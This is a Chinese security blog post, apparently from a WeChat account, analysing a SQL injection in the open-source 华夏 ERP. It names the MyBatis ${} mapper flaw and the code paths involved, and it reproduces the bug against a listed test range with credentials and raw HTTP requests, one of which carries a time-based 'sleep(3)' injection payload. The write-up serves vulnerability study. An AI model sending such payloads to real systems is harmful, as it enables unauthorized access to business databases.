> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/o-lmJHCaCiEqfdG1e_L3Lg)

测试靶场

<table cellspacing="0" cellpadding="0"><tbody><tr><td width="132" valign="top"><p>靶场地址</p></td><td width="421" colspan="2" valign="top"><p>http://47.116.69.14</p></td></tr><tr><td width="132" valign="top"><p>账户密码</p></td><td width="210" valign="top"><p><strong>jsh</strong></p></td><td width="210" valign="top"><p><strong>123456</strong></p></td></tr></tbody></table>

**1、描述**

  

华夏 ERP 基于 SpringBoot 框架和 SaaS 模式，可以算作是国内人气比较高的一款 ERP 项目，但经过源码审计发现其存在多个漏洞，本篇为 SQL 注入漏洞解析。

  

  

  

  

  

**2、影响范围**

  

华夏 ERP  

  

  

  

  

  

**3、漏洞复现**

  

从开源项目本地搭建来进行审计，源码下载地址：

百度网盘 https://pan.baidu.com/s/1jlild9uyGdQ7H2yaMx76zw  提取码: 814g  

  

  

  

  

  

漏洞复现：

1、漏洞代码位置

```
src/main/resources/mapper_xml/UserMapperEx.xml
```

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8YuSY9mticHm3T872zjEAntcNlordxU2Yfd0uB8jSNAz8qo0bzJsH406w/640?wx_fmt=png)

使用 mybatis 时 ${} 会对参数和 sql 语句进行拼接，因而存在 sql 注入漏洞

2、漏洞验证  

正常查询  

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Y53Qlmw7z2fyWv54iaeVETYmGZZH0CibGqWDRYxaiclhkuqLqnjuXFsHZg/640?wx_fmt=png)

```
GET /user/list?search=%7B%22userName%22%3A%22%22%2C%22loginName%22%3A%22q%22%2C%22offset%22%3A%221%22%2C%22rows%22%3A%221%22%7D¤tPage=1&pageSize=10&t=1615274773529 HTTP/1.1
Host: 47.116.69.14
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://47.116.69.14/pages/manage/user.html
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274745; JSESSIONID=C5EBD91E0E68081AA25F206F2FECAC82; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274770
```

使用 sleep 延时注入

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8YM6rH6hNlXBzGibnH7giaXQ2iblT35Yibl8vJOxVJJ0y4FM3M8t53xY4c4g/640?wx_fmt=png)

```
GET /user/list?search=%7B%22userName%22%3A%22'and+sleep(3)--%22%2C%22loginName%22%3A%22q%22%2C%22offset%22%3A%221%22%2C%22rows%22%3A%221%22%7D¤tPage=1&pageSize=10&t=1615274773529 HTTP/1.1
Host: 47.116.69.14
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Connection: close
Referer: http://47.116.69.14/pages/manage/user.html
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274745; JSESSIONID=C5EBD91E0E68081AA25F206F2FECAC82; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1615274770
```

3、漏洞代码

src/main/java/com/jsh/erp/controller/ResourceController.java

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8YrfNG1EjePhr2EofCgGI4U09D9NyWd5uZiafA29ddf5ia44aPUUwxFhcA/640?wx_fmt=png)

src/main/java/com/jsh/erp/service/CommonQueryManager.java

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8YUr2tCy2p8ImULvRia9PaKXaYqT5vn5EptEE9VickRTrAU55pKuoZ0Sug/640?wx_fmt=png)

src/main/java/com/jsh/erp/service/user/UserComponent.java

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8YtiaokDicq8xOicLVddoko6QgfTe0bfJwL2fkP4IAicyPiadtGlc3ulJ4sVg/640?wx_fmt=png)

src/main/java/com/jsh/erp/service/user/UserService.java

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8YFWtiaUibZf3RNP967ic8pxj8j1Oh3jtRlz2ryKAUPGUOmZ7WiaQ5wpjOJA/640?wx_fmt=png)

src/main/resources/mapper_xml/UserMapperEx.xml

![](https://mmbiz.qpic.cn/mmbiz_png/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8YAvjiaEsZOptmIpKS1pdoccLo1qjZMMwSa0xQw8bzk816RgmXCmVIibiag/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/nMQkaGYuOibDavXvuud5F09Tjl7NMvU8Yzhia63knJ4QJFvO4WBfd6KQazjtuPC7uqNBt5gE06ia7GjOVn2RFOicNA/640?wx_fmt=jpeg)

扫取二维码获取

更多精彩

![](https://mmbiz.qpic.cn/mmbiz_png/TlgiajQKAFPtOYY6tXbF7PrWicaKzENbNF71FLc4vO5nrH2oxBYwErfAHKg2fD520niaCfYbRnPU6teczcpiaH5DKA/640?wx_fmt=png)

Qingy 之安全  

![](https://mmbiz.qpic.cn/mmbiz_png/Y8TRQVNlpCW6icC4vu5Pl5JWXPyWdYvGAyfVstVJJvibaT4gWn3Mc0yqMQtWpmzrxibqciazAr5Yuibwib5wILBINfuQ/640?wx_fmt=png)

公众号

![](https://mmbiz.qpic.cn/mmbiz_png/3pKe8enqDsSibzOy1GzZBhppv9xkibfYXeOiaiaA8qRV6QNITSsAebXibwSVQnwRib6a2T4M8Xfn3MTwTv1PNnsWKoaw/640?wx_fmt=png)

点个在看你最好看